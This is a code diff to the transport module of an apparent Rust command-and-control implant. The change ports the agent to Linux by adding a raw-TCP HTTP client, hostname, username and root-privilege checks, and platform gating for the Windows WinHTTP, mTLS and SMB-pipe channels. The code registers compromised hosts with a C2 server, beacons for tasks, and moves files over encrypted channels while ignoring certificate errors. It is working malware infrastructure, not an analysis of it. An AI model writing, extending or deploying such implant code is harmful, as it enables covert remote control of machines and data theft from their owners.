@@ -1,5 +1,5 @@
 /// HTTP/HTTPS/TCP/mTLS transport for the Rust agent.
-/// HTTP/HTTPS/mTLS: WinHTTP (same protocol as Go/Nim agents).
+/// HTTP/HTTPS/mTLS: WinHTTP (Windows) or raw TCP (Linux).
 /// TCP: std::net with 4-byte LE-length-prefixed framed JSON.
 ///
 /// Registration: POST /register or TCP "register" msg → {agent_id, aes_key}
@@ -12,6 +12,8 @@ use core::ptr;
 use std::io::{Read, Write};
 use base64::{engine::general_purpose::STANDARD, Engine as _};
 use serde_json::Value;
+
+#[cfg(target_os = "windows")]
 use windows_sys::Win32::Networking::WinHttp::{
     WinHttpAddRequestHeaders, WinHttpCloseHandle, WinHttpConnect, WinHttpOpen, WinHttpOpenRequest,
     WinHttpQueryHeaders, WinHttpReadData, WinHttpReceiveResponse, WinHttpSendRequest, WinHttpSetOption,
@@ -20,31 +22,45 @@ use windows_sys::Win32::Networking::WinHttp::{
 };
 
 use crate::{config, crypto};
-use crate::{transport_dns, transport_doh, transport_smb};
+use crate::transport_dns;
+use crate::transport_doh;
+#[cfg(target_os = "windows")]
+use crate::transport_smb;
 
 // Self-signed cert ignore flags (standard WinHTTP constants)
+#[cfg(target_os = "windows")]
 const SEC_IGNORE_UNKNOWN_CA: u32        = 0x0100;
+#[cfg(target_os = "windows")]
 const SEC_IGNORE_CERT_WRONG_USAGE: u32  = 0x0200;
+#[cfg(target_os = "windows")]
 const SEC_IGNORE_CERT_CN_INVALID: u32   = 0x1000;
+#[cfg(target_os = "windows")]
 const SEC_IGNORE_CERT_DATE_INVALID: u32 = 0x2000;
 
 // mTLS: set the client certificate on a WinHTTP request
+#[cfg(target_os = "windows")]
 const WINHTTP_OPTION_CLIENT_CERT_CONTEXT: u32 = 47;
 
 // crypt32 encoding / search constants
+#[cfg(target_os = "windows")]
 const X509_ASN_ENCODING: u32   = 0x00000001;
+#[cfg(target_os = "windows")]
 const PKCS_7_ASN_ENCODING: u32 = 0x00010000;
+#[cfg(target_os = "windows")]
 const CERT_FIND_ANY: u32       = 0;
+#[cfg(target_os = "windows")]
 const CRYPT_EXPORTABLE: u32    = 0x00000001;
 
 // ── crypt32 imports ───────────────────────────────────────────────────────────
 
+#[cfg(target_os = "windows")]
 #[repr(C)]
 struct CryptDataBlob {
     cb_data: u32,
     pb_data: *const u8,
 }
 
+#[cfg(target_os = "windows")]
 #[link(name = "crypt32")]
 extern "system" {
     fn PFXImportCertStore(
@@ -65,7 +81,9 @@ extern "system" {
 
 // ── RAII WinHTTP handle wrapper ───────────────────────────────────────────────
 
+#[cfg(target_os = "windows")]
 struct WHandle(*mut c_void);
+#[cfg(target_os = "windows")]
 impl Drop for WHandle {
     fn drop(&mut self) {
         if !self.0.is_null() {
@@ -73,6 +91,7 @@ impl Drop for WHandle {
         }
     }
 }
+#[cfg(target_os = "windows")]
 impl WHandle {
     fn is_null(&self) -> bool { self.0.is_null() }
     fn raw(&self) -> *mut c_void { self.0 }
@@ -80,6 +99,7 @@ impl WHandle {
 
 // ── Wide string helper ────────────────────────────────────────────────────────
 
+#[cfg(target_os = "windows")]
 pub(crate) fn wstr(s: &str) -> Vec<u16> {
     s.encode_utf16().chain(core::iter::once(0u16)).collect()
 }
@@ -137,10 +157,11 @@ fn tcp_read_frame(stream: &mut std::net::TcpStream) -> Option<Vec<u8>> {
     Some(data)
 }
 
-// ── mTLS certificate loader ───────────────────────────────────────────────────
+// ── mTLS certificate loader (Windows only) ────────────────────────────────────
 
 /// Decode `config::AGENT_PFX` (base64 PKCS12) and return a CERT_CONTEXT pointer
 /// suitable for `WINHTTP_OPTION_CLIENT_CERT_CONTEXT`.  Returns null on any failure.
+#[cfg(target_os = "windows")]
 fn load_mtls_cert() -> *mut c_void {
     let pfx_b64 = config::AGENT_PFX;
     if pfx_b64.is_empty() {
@@ -174,10 +195,11 @@ fn load_mtls_cert() -> *mut c_void {
     }
 }
 
-// ── Core HTTP implementation ──────────────────────────────────────────────────
+// ── Core HTTP implementation (Windows: WinHTTP) ───────────────────────────────
 
 /// Internal HTTP worker.  Pass `cert_ctx = null_mut()` for plain HTTP/HTTPS;
 /// pass a valid CERT_CONTEXT pointer for mTLS.
+#[cfg(target_os = "windows")]
 pub(crate) fn http_do_inner(method: &str, path: &str, body: &[u8], cert_ctx: *mut c_void) -> Option<(u32, Vec<u8>)> {
     let p = parse_url(config::SERVER_URL);
     let full_path = format!("{}{}", p.base, path);
@@ -284,11 +306,13 @@ pub(crate) fn http_do_inner(method: &str, path: &str, body: &[u8], cert_ctx: *mu
 }
 
 /// Public HTTP helper (no client certificate).  Used for plain http/https transport.
+#[cfg(target_os = "windows")]
 pub fn http_do(method: &str, path: &str, body: &[u8]) -> Option<(u32, Vec<u8>)> {
     http_do_inner(method, path, body, ptr::null_mut())
 }
 
 /// Like http_do but injects an extra request header (e.g., "X-C2-Parent: <id>\r\n").
+#[cfg(target_os = "windows")]
 pub fn http_do_with_header(method: &str, path: &str, body: &[u8], extra_header: &str) -> Option<(u32, Vec<u8>)> {
     if extra_header.is_empty() { return http_do(method, path, body); }
     let p = parse_url(config::SERVER_URL);
@@ -324,6 +348,68 @@ pub fn http_do_with_header(method: &str, path: &str, body: &[u8], extra_header: 
         }
         Some((status, data))
     }
+}
+
+// ── Core HTTP implementation (Linux: raw TCP) ─────────────────────────────────
+
+#[cfg(not(target_os = "windows"))]
+pub(crate) fn http_do_inner(method: &str, path: &str, body: &[u8], _cert_ctx: *mut c_void) -> Option<(u32, Vec<u8>)> {
+    http_do_linux_inner(method, path, body, "")
+}
+
+#[cfg(not(target_os = "windows"))]
+pub fn http_do(method: &str, path: &str, body: &[u8]) -> Option<(u32, Vec<u8>)> {
+    http_do_linux_inner(method, path, body, "")
+}
+
+#[cfg(not(target_os = "windows"))]
+pub fn http_do_with_header(method: &str, path: &str, body: &[u8], extra_header: &str) -> Option<(u32, Vec<u8>)> {
+    http_do_linux_inner(method, path, body, extra_header)
+}
+
+/// Minimal HTTP/1.1 client over plain TCP (no TLS).
+/// Supports HTTP; returns None for HTTPS (no TLS stack without an extra crate).
+#[cfg(not(target_os = "windows"))]
+fn http_do_linux_inner(method: &str, path: &str, body: &[u8], extra_header: &str) -> Option<(u32, Vec<u8>)> {
+    use std::net::TcpStream;
+
+    let p = parse_url(config::SERVER_URL);
+    let full_path = format!("{}{}", p.base, path);
+
+    let addr = format!("{}:{}", p.host, p.port);
+    let mut stream = TcpStream::connect(&addr).ok()?;
+
+    // Build HTTP/1.1 request
+    let mut req = format!(
+        "{} {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nContent-Length: {}\r\nConnection: close\r\n",
+        method, full_path, p.host, config::USER_AGENT, body.len()
+    );
+    if !body.is_empty() {
+        req.push_str("Content-Type: application/octet-stream\r\n");
+    }
+    if !extra_header.is_empty() {
+        req.push_str(extra_header);
+    }
+    req.push_str("\r\n");
+
+    stream.write_all(req.as_bytes()).ok()?;
+    if !body.is_empty() {
+        stream.write_all(body).ok()?;
+    }
+
+    let mut resp_bytes = Vec::new();
+    stream.read_to_end(&mut resp_bytes).ok()?;
+
+    // Find end of headers
+    let header_end = resp_bytes.windows(4).position(|w| w == b"\r\n\r\n")?;
+    let header_str = std::str::from_utf8(&resp_bytes[..header_end]).ok()?;
+
+    // Parse status code from first line: "HTTP/1.1 200 OK"
+    let status_line = header_str.lines().next()?;
+    let status: u32 = status_line.split_whitespace().nth(1)?.parse().ok()?;
+
+    let resp_body = resp_bytes[header_end + 4..].to_vec();
+    Some((status, resp_body))
 }
 
 // ── Agent transport ───────────────────────────────────────────────────────────
@@ -385,6 +471,7 @@ impl AgentTransport {
                     .unwrap_or(config::SERVER_URL);
                 t.tcp_addr = addr.to_string();
             }
+            #[cfg(target_os = "windows")]
             "mtls" => {
                 t.cert_ctx = load_mtls_cert();
             }
@@ -401,6 +488,7 @@ impl AgentTransport {
             "doh" => {
                 // DoH uses HTTP for registration; no extra state needed
             }
+            #[cfg(target_os = "windows")]
             "smb" => {
                 // SMB pipe opened during registration
             }
@@ -413,13 +501,14 @@ impl AgentTransport {
         std::env::current_exe()
             .ok()
             .and_then(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()))
-            .unwrap_or_else(|| "agent.exe".to_string())
+            .unwrap_or_else(|| "agent".to_string())
     }
 
     pub fn register(&mut self) -> bool {
         self.try_register().is_some()
     }
 
+    #[cfg(target_os = "windows")]
     fn is_elevated() -> bool {
         use windows_sys::Win32::Foundation::CloseHandle;
         use windows_sys::Win32::Security::{
@@ -441,6 +530,12 @@ impl AgentTransport {
             CloseHandle(token);
             ok != 0 && elev.TokenIsElevated != 0
         }
+    }
+
+    #[cfg(not(target_os = "windows"))]
+    fn is_elevated() -> bool {
+        // Check if running as root (uid 0)
+        unsafe { libc_getuid() == 0 }
     }
 
     // ── TCP helpers ───────────────────────────────────────────────────────────
@@ -488,6 +583,7 @@ impl AgentTransport {
                 // DNS doesn't use AES; leave aes_key empty
                 return Some(());
             }
+            #[cfg(target_os = "windows")]
             "smb" => {
                 let h = transport_smb::open_pipe(config::SMB_PIPE);
                 if h == -1isize { return None; }
@@ -500,10 +596,20 @@ impl AgentTransport {
             _ => {}
         }
 
+        let hostname = get_hostname();
+        let username = get_username();
+        let os_str = if cfg!(target_os = "windows") {
+            if cfg!(target_arch = "x86_64") { "windows/amd64" } else { "windows/x86" }
+        } else if cfg!(target_os = "linux") {
+            if cfg!(target_arch = "x86_64") { "linux/amd64" } else { "linux/x86" }
+        } else {
+            "unknown"
+        };
+
         let body = serde_json::json!({
-            "hostname":     std::env::var("COMPUTERNAME").unwrap_or_else(|_| "UNKNOWN".into()),
-            "username":     std::env::var("USERNAME").unwrap_or_else(|_| "UNKNOWN".into()),
-            "os":           if cfg!(target_arch = "x86_64") { "windows/amd64" } else { "windows/x86" },
+            "hostname":     hostname,
+            "username":     username,
+            "os":           os_str,
             "pid":          std::process::id(),
             "transport":    config::TRANSPORT,
             "sleep_sec":    config::SLEEP_SEC,
@@ -565,6 +671,7 @@ impl AgentTransport {
                 };
                 return parse_tasks(&plain);
             }
+            #[cfg(target_os = "windows")]
             "smb" => {
                 if self.smb_pipe == -1isize { return vec![]; }
                 let resp = match transport_smb::beacon(self.smb_pipe, &self.agent_id) {
@@ -639,6 +746,7 @@ impl AgentTransport {
                 }
                 return;
             }
+            #[cfg(target_os = "windows")]
             "smb" => {
                 if self.smb_pipe != -1isize {
                     transport_smb::send_result(self.smb_pipe, &self.agent_id,
@@ -675,11 +783,18 @@ impl AgentTransport {
 
     pub fn upload_file(&mut self, task_id: i64, filename: &str, data: &[u8]) {
         match config::TRANSPORT {
-            "dns" | "smb" => {
+            "dns" => {
                 // Not supported — send a note as the result
                 self.send_result(task_id,
                     &format!("file:{}:size={}", filename, data.len()),
-                    "upload-not-supported-over-dns-smb");
+                    "upload-not-supported-over-dns");
+                return;
+            }
+            #[cfg(target_os = "windows")]
+            "smb" => {
+                self.send_result(task_id,
+                    &format!("file:{}:size={}", filename, data.len()),
+                    "upload-not-supported-over-smb");
                 return;
             }
             "tcp" => {
@@ -704,7 +819,10 @@ impl AgentTransport {
 
     pub fn download_file(&mut self, filename: &str) -> Vec<u8> {
         match config::TRANSPORT {
-            "dns" | "smb" | "tcp" => return vec![],
+            "dns" => return vec![],
+            #[cfg(target_os = "windows")]
+            "smb" => return vec![],
+            "tcp" => return vec![],
             _ => {}
         }
         if self.aes_key.is_empty() { return vec![]; }
@@ -713,6 +831,41 @@ impl AgentTransport {
         if code != 200 || resp.is_empty() { return vec![]; }
         crypto::open(&self.aes_key, &resp).unwrap_or_default()
     }
+}
+
+// ── Hostname / username helpers ───────────────────────────────────────────────
+
+fn get_hostname() -> String {
+    #[cfg(target_os = "windows")]
+    { std::env::var("COMPUTERNAME").unwrap_or_else(|_| "UNKNOWN".into()) }
+    #[cfg(not(target_os = "windows"))]
+    {
+        // Try $HOSTNAME env var first, then read /proc/sys/kernel/hostname
+        std::env::var("HOSTNAME").unwrap_or_else(|_| {
+            std::fs::read_to_string("/proc/sys/kernel/hostname")
+                .map(|s| s.trim().to_string())
+                .unwrap_or_else(|_| "UNKNOWN".into())
+        })
+    }
+}
+
+fn get_username() -> String {
+    #[cfg(target_os = "windows")]
+    { std::env::var("USERNAME").unwrap_or_else(|_| "UNKNOWN".into()) }
+    #[cfg(not(target_os = "windows"))]
+    { std::env::var("USER").or_else(|_| std::env::var("LOGNAME")).unwrap_or_else(|_| "UNKNOWN".into()) }
+}
+
+// ── libc uid helper (Linux only) ─────────────────────────────────────────────
+
+#[cfg(not(target_os = "windows"))]
+extern "C" {
+    fn getuid() -> u32;
+}
+
+#[cfg(not(target_os = "windows"))]
+fn libc_getuid() -> u32 {
+    unsafe { getuid() }
 }
 
 // ── Task deserialisation helper ───────────────────────────────────────────────
